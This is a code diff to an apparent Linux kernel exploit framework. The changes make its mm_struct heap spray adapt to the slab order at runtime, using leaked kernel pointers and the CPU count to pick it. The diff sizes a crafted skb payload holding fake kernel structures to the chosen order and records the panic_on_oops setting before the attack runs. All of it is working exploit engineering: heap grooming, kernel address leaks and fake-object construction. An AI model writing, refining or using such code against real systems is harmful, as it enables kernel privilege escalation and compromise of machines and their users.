@@ -8,6 +8,7 @@
 #include "support/native_resource.hpp"
 #include "kernel/target.h"
 #include "kernelsnitch/kernelsnitch.h"
+#include "kernelsnitch/slab_order.h"
 #include "kernelsnitch/stride_verify.h"
 
 /* Session aliases kept from the preprocessor era: the attack statements were
@@ -28,6 +29,10 @@ namespace {
     unsigned char *skb_buf() {
         return ghostlock::session::g_exploit_session.heap.skb_buffer.get();
     }
+
+    /* One native process per run; the page path's leak votes on the mm_struct
+     * slab order across this run's prepare calls. */
+    ghostlock::kernelsnitch::SlabOrderVote g_slab_order_vote;
 } // namespace
 
 namespace ghostlock::support {
@@ -81,10 +86,14 @@ namespace ghostlock::support {
         std::array < char, 32 > enforce{};
         std::array < char, 4096 > status{};
         std::array < char, 160 > limits{};
+        std::array < char, 32 > panic_on_oops{};
         snprintf(limits.data(), limits.size(),
                  "NoNewPrivs=? Seccomp=? Seccomp_filters=?");
         read_first_line("/proc/self/attr/current", attr.data(), attr.size());
         read_first_line("/sys/fs/selinux/enforce", enforce.data(), enforce.size());
+        /* The fact that decides whether an oops panics or wedges. */
+        read_first_line("/proc/sys/kernel/panic_on_oops", panic_on_oops.data(),
+                        panic_on_oops.size());
         support::UniqueFd fd(open("/proc/self/status", O_RDONLY | O_CLOEXEC));
         if (fd.valid()) {
             const ssize_t n = read(fd.get(), status.data(), status.size() - 1);
@@ -134,6 +143,7 @@ namespace ghostlock::support {
                    getpid(), getuid(), geteuid(), getgid(), getegid(), boot_ms,
                    attr.data(), enforce.data());
         pr_success("startup limits pid=%d %s\n", getpid(), limits.data());
+        pr_success("startup sysctl pid=%d panic_on_oops=%s\n", getpid(), panic_on_oops.data());
         pr_success("build config pid=%d label=%s slide=pselect main=pselect\n",
                    getpid(), kernel::BUILD_VARIANT_LABEL);
         pr_success("p0 profile pid=%d phys_offset=%016llx kernel_phys_load=%016llx "
@@ -506,8 +516,9 @@ namespace ghostlock::support {
         return 1;
     }
 
-    int32_t prepare_skb_payload(uintptr_t base, const memory::WriteRequest *request) {
-        memset(skb_buf(), 0, kernel::SKB_SEND_SIZE);
+    int32_t prepare_skb_payload(uintptr_t base, size_t slab_size, size_t send_size,
+                                const memory::WriteRequest *request) {
+        memset(skb_buf(), 0, send_size);
 
         const bool tcp_layout = route::route_capability(
             session::g_exploit_session.profile,
@@ -562,7 +573,7 @@ namespace ghostlock::support {
         const bool wake_state_layout =
                 compact && session::g_exploit_session.profile.compact_waiter_has_wake_state();
 
-        for (size_t chunk = 0; chunk < kernel::SKB_SEND_SIZE; chunk += kernel::ORDER3_SIZE) {
+        for (size_t chunk = 0; chunk < send_size; chunk += slab_size) {
             unsigned char *p = skb_buf() + chunk + chunk_bias;
 
             put32(p, kernel::LOCK_OFF + 0x00, 0);
@@ -758,13 +769,44 @@ namespace ghostlock::support {
                 spray_stride = candidate;
             }
         }
-        mm_objs_per_slab = kernel::ORDER3_SIZE / spray_stride;
-        pr_info("[spray] mm_struct stride=%u objects_per_slab=%zu\n",
-                spray_stride, mm_objs_per_slab);
+        /* The order is a runtime fact: SLUB's calculate_order() sizes the cache
+         * from nr_cpu_ids, so the rule is only a prior. The leak in this call
+         * votes on the order for the next one; the spray contexts below are
+         * sized from this call's choice. */
+        const long configured_cpus = sysconf(_SC_NPROCESSORS_CONF);
+        const uint32_t nr_cpu_ids =
+                configured_cpus > 0 ? static_cast<uint32_t>(configured_cpus) : 1U;
+        const uint32_t prior_order =
+                kernelsnitch::slab_order_prior(spray_stride, nr_cpu_ids);
+        const uint32_t slab_order = g_slab_order_vote.choose(prior_order);
+        const size_t slab_size = kernelsnitch::slab_bytes(slab_order);
+        const bool tcp_layout = route::route_capability(
+            session::g_exploit_session.profile,
+            [](auto policy) { return std::decay_t<decltype(policy)>::tcp_payload_layout; });
+        /* The non-tcp payload stays inside one 8 KiB slab (the fake task's
+         * pi fields end before 0x1b80); the tcp layout puts fake_task at
+         * 0x5800, so it needs the compiled order-3 geometry. */
+        const uint32_t required_order = tcp_layout ? kernel::MM_ORDER : 1U;
+        if (slab_order < required_order) {
+            pr_error("[spray] slab order %u (stride %u, %u cpus) is below the %s "
+                     "payload's order %u; refusing\n",
+                     slab_order, spray_stride, nr_cpu_ids,
+                     tcp_layout ? "tcp" : "page", required_order);
+            return 0;
+        }
+        const size_t send_size = slab_size * 2;
+        const size_t objects_per_slab = slab_size / spray_stride;
+        mm_objs_per_slab = objects_per_slab != 0 ? objects_per_slab : 1;
+        session::g_exploit_session.heap.mm_slab_size = slab_size;
+        pr_info("[spray] mm_struct stride=%u objects_per_slab=%zu slab_order=%u "
+                "slab_size=%zu send_size=%zu prior_order=%u leak_votes=%u\n",
+                spray_stride, mm_objs_per_slab, slab_order, slab_size, send_size,
+                prior_order, g_slab_order_vote.observations());
         prepare_ctxs();
 
-        session::g_exploit_session.heap.skb_buffer = std::make_unique<unsigned char[]>(kernel::SKB_SEND_SIZE);
-        memset(skb_buf(), 0x41, kernel::SKB_SEND_SIZE);
+        session::g_exploit_session.heap.skb_buffer =
+                std::make_unique<unsigned char[]>(send_size);
+        memset(skb_buf(), 0x41, send_size);
 
         for (size_t i = 0; i < prepare_ctx.childs.size(); i++) {
             prepare_ctx.childs[i] = clone_child();
@@ -899,7 +941,15 @@ namespace ghostlock::support {
             return 0;
         }
 
-        uintptr_t base = leaked & ~(kernel::ORDER3_SIZE - 1);
+        /* The fresh leak votes on the order: a candidate that failed once is
+         * out, and a prior that has never failed is kept. A corrected order
+         * applies to the next prepare call (the contexts are already sized). */
+        g_slab_order_vote.observe(leaked, spray_stride);
+        pr_info("[spray] slab vote prior=%u chosen=%u next=%u leaks=%u\n",
+                prior_order, slab_order, g_slab_order_vote.choose(prior_order),
+                g_slab_order_vote.observations());
+
+        uintptr_t base = leaked & ~(slab_size - 1);
         if (leak_only) {
             /* Probe round: the mm_struct leak is the whole result. Tear the
              * spray down exactly as the payload path does at its tail, minus
@@ -916,7 +966,7 @@ namespace ghostlock::support {
             cleanup_page_prepare_state();
             return base;
         }
-        if (!prepare_skb_payload(base, request)) {
+        if (!prepare_skb_payload(base, slab_size, send_size, request)) {
             snitch.reset();
             for (size_t i = 0; i < prepare_ctx.childs.size(); i++) {
                 kill_child(prepare_ctx.childs[i]);
@@ -938,7 +988,7 @@ namespace ghostlock::support {
 
         struct iovec iov{};
         iov.iov_base = skb_buf();
-        iov.iov_len = kernel::SKB_SEND_SIZE;
+        iov.iov_len = send_size;
 
         struct msghdr msg{};
         msg.msg_iov = &iov;
@@ -1109,8 +1159,14 @@ namespace ghostlock::support {
             }
             const uintptr_t leaked =
                     session::g_exploit_session.heap.current.last_mm_struct;
+            /* Mask with the slab size the prepare call used; the leak vote may
+             * have corrected it from the previous round. */
+            const std::size_t slab_size =
+                    session::g_exploit_session.heap.mm_slab_size != 0
+                        ? session::g_exploit_session.heap.mm_slab_size
+                        : kernel::ORDER3_SIZE;
             const auto offset = static_cast<std::size_t>(
-                leaked & (kernel::ORDER3_SIZE - 1));
+                leaked & (slab_size - 1));
             verifier.add_offset(offset);
             pr_info("[stride] round=%zu offset=0x%zx\n",
                     verifier.rounds(), offset);
@@ -1121,9 +1177,13 @@ namespace ghostlock::support {
                 verifier.voted_count(), verifier.decided() ? 1 : 0, attempts);
         for (std::size_t i = 0; i < verifier.voted_count(); i++) {
             const kernelsnitch::StrideCandidateVote candidate = verifier.voted(i);
+            const std::size_t slab_size =
+                    session::g_exploit_session.heap.mm_slab_size != 0
+                        ? session::g_exploit_session.heap.mm_slab_size
+                        : kernel::ORDER3_SIZE;
             pr_info("[stride] candidate value=%zu votes=%zu/%zu objects=%zu\n",
                     candidate.value, candidate.votes, verifier.samples(),
-                    kernel::ORDER3_SIZE / candidate.value);
+                    slab_size / candidate.value);
         }
         if (!verifier.any_votes()) {
             pr_warning("[stride] no candidate: no round produced a vote\n");
